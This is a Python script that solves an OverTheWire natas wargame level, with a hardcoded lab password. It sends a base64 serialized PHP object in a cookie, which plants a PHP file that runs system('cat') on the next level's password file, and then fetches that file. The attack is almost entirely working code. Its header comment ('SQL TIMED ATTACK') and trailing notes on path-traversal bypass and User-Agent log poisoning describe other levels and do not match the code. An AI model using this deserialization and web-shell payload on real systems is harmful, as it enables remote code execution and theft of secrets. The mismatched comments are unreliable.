#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *
import base64


characters = lowercase + uppercase + digits	
	
username='natas26'
password='oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.session()
cookie = {'drawing':'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMToiaW1nL2FiYy5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoyMjoiIy0tc2Vzc2lvbiBzdGFydGVkLS0jCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=='}
response = session.post(url, auth=(username, password), cookies=cookie)

content = response.text
# print content
print "="*80
# print session.cookies

response = session.get(url + 'img/abc.php', auth=(username,password))
print response.text
# print  re.findall('Password: (.*)</pre>', content)[0]


#This level was quite a lot complicated. It santized '../' with '' so we had to bypass that somehow. So we entered '..././', so that after santization it becomes '../'. Doing this, the /etc/passwd file was not accessible. So we then tried to read the log file that was being stored for each session. 
#Over there it was observed that it was reading the 'User-Agent' from the client, so we passed a php RCE command in order to read the natas26 file.